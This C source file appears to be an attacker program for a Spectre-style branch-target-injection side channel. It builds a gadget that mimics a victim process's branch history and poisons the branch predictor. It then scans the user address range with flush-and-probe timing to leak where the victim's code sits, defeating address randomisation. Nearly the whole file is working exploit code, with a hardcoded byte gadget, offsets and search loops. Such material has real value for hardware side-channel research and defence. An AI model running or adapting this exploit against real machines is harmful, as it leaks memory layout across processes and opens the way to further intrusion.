#include "utils.h"
#include <stdio.h>
#include <string.h>

/*
    victim inspection -> g1 gadget must mimic the BHB behaviour of the last N branches
    g1 gadget copies the same instructions but changes ret to indirect branch

gef➤  disas /r f1
Dump of assembler code for function f1:
   0x0000000000001149 <+0>:     f3 0f 1e fa     endbr64
   0x000000000000114d <+4>:     55      push   rbp
   0x000000000000114e <+5>:     48 89 e5        mov    rbp,rsp
   0x0000000000001151 <+8>:     53      push   rbx
   0x0000000000001152 <+9>:     bb 00 00 00 00  mov    ebx,0x0
   0x0000000000001157 <+14>:    eb 03   jmp    0x115c <f1+19>
   0x0000000000001159 <+16>:    83 c3 01        add    ebx,0x1
   0x000000000000115c <+19>:    81 fb c7 00 00 00       cmp    ebx,0xc7
   0x0000000000001162 <+25>:    7e f5   jle    0x1159 <f1+16>
   0x0000000000001164 <+27>:    90      nop
   0x0000000000001165 <+28>:    90      nop
   0x0000000000001166 <+29>:    5b      pop    rbx
   0x0000000000001167 <+30>:    5d      pop    rbp
   0x0000000000001168 <+31>:    c3      ret
End of assembler dump.

gef➤  disas /r main
Dump of assembler code for function main:
   0x0000000000001169 <+0>:     f3 0f 1e fa     endbr64
   0x000000000000116d <+4>:     55      push   rbp
   0x000000000000116e <+5>:     48 89 e5        mov    rbp,rsp
   0x0000000000001171 <+8>:     48 8d 35 d1 ff ff ff    lea    rsi,[rip+0xffffffffffffffd1]        # 0x1149 <f1>
   0x0000000000001178 <+15>:    48 8d 3d 85 0e 00 00    lea    rdi,[rip+0xe85]        # 0x2004
   0x000000000000117f <+22>:    b8 00 00 00 00  mov    eax,0x0
   0x0000000000001184 <+27>:    e8 c7 fe ff ff  call   0x1050 <printf@plt>
   0x0000000000001189 <+32>:    b8 00 00 00 00  mov    eax,0x0
   0x000000000000118e <+37>:    e8 b6 ff ff ff  call   0x1149 <f1>
   0x0000000000001193 <+42>:    eb f4   jmp    0x1189 <main+32>
End of assembler dump.

*/

// The gadget, DSTOFFSET and SRCOFFSET may change according to the compiler

uint8_t g1[] = "\xbb\x00\x00\x00\x00\xeb\x03\x83\xc3\x01\x81\xfb\xc7\x00\x00\x00\x7e\xf5\x90\x90\x90\x90\xff\x27"; 
// g1 goes to offset 0x152

// offset of the instruction target of the return on victim code
#define DSTOFFSET 0x193ULL
// start of the gadget on victim code
#define SRCOFFSET 0x152ULL

// start of address to search
#define CANON_START 0x555000000000UL
// end of the address to search
#define CANON_END 0x570000000000UL


uint8_t *rdiPtr;
uint8_t probeArray[0x2000];

void f1() {}

/*
Detects an indirect branch mispeculation with target address(virtual) between ranges start-end.

rwx1 = pointer for the start of the first gadget that mimics the behaviour of the victim (there are 256 possible gadgets)
rwx2 = block of <simPages> number of pages of leak gadgets
simPages = Number of 4k pages containing a leak gadget to be tested simultaneously
start = start address of the search
end = last address of the search
*/
uint8_t *leak(uint8_t *rwx1, uint8_t *rwx2, uint64_t simPages, uint64_t start, uint64_t end)
{

    volatile uint8_t d;
    unsigned trials = 0;
    uint8_t *dstPages = rwx2;

    for (uint8_t *addr = (uint8_t *)start; addr <= (uint8_t *)end; addr += (simPages * 0x1000UL))
    {
        if (trials++ % 100 == 0)
        {
            printf("\rtesting %p", addr);
        }

        dstPages = requestMemremap(addr, dstPages, simPages * 0x1000UL);

        // do some gadget caching. The number of pages tested simultaneously might change depending on the architecture. Optimized for i5-7500 here, supporting up to 0x3000 pages per try
        for (uint64_t i = 0; i < simPages; i++)
        {
            d = *(dstPages + i * 0x1000ULL + DSTOFFSET);
        }

        // try 3 times for each address range, increases the probability of success
        for (int j = 0; j < 3; j++)
        {

            for (unsigned i = 0; i < 0x100; i++)
            {
                flush((uint8_t *)&rdiPtr);
                callGadget(rwx1 + i * 0x1000, (uint8_t *)&rdiPtr, (uint8_t *)&probeArray[0x1000]);
            }

            if (probe(&probeArray[0x1000]) < THRESHOLD)
            {
                printf("\nSpeculation detected at address %p\n", addr);
                return addr;
            }

            // not needed if using hyperthread. Allows the victim to poison the BTB again
            usleep(1);
        }
    }
    return NULL;
}

int main(int argc, char **argv)
{

    memset(probeArray, 2, 0x1000);
    memset(probeArray + 0x1000, 3, 0x1000);

    if (argc < 2)
    {
        printf("Usage:   taskset -c <desired core> ./attacker <simPages>\n");
        printf("Example: taskset -c 0 ./attacker 0x1000\n");
        return 0;
    }

    uint64_t simPages = (uint64_t)strtoull(argv[1], NULL, 16);

    uint8_t *rwx1 = requestMem(NULL, 0x100000);
    uint8_t *rwx2 = requestMem(NULL, 0x1000 * simPages);

    // set up source mimic gadget into all possible 20-lsb aligned positions
    for (unsigned i = 0; i < 0x100; i++)
    {
        memcpy(rwx1 + i * 0x1000UL + SRCOFFSET, g1, sizeof(g1));
    }

    // real indirect branch destination does nothing
    rdiPtr = (uint8_t *)f1;

    // but misspredicted destination jumps to one of the leakGadgets
    for (uint64_t i = 0; i < simPages; i++)
    {
        copyLeakGadget(rwx2 + i * 0x1000UL + DSTOFFSET);
    }

    printf("Src ptr at, rwx1=%p\n", rwx1);
    printf("Dst ptr at, rwx2=%p\n", rwx2);
    printf("Dst ptr at, rdiPtr=%p\n", rdiPtr);

    uint8_t *res = leak(rwx1 + SRCOFFSET, rwx2, simPages, CANON_START, CANON_END);
    if (res != NULL)
    {
        printf("Leaking the remaining bits\n");
        requestMemFree(res, simPages * 0x1000UL);
        rwx2 = requestMem(NULL, 0x1000);
        copyLeakGadget(rwx2 + DSTOFFSET);
        leak(rwx1 + SRCOFFSET, rwx2, 1, (uint64_t)res, (uint64_t)res + simPages * 0x1000UL);
    }

    printf("\nFinished\n");
}
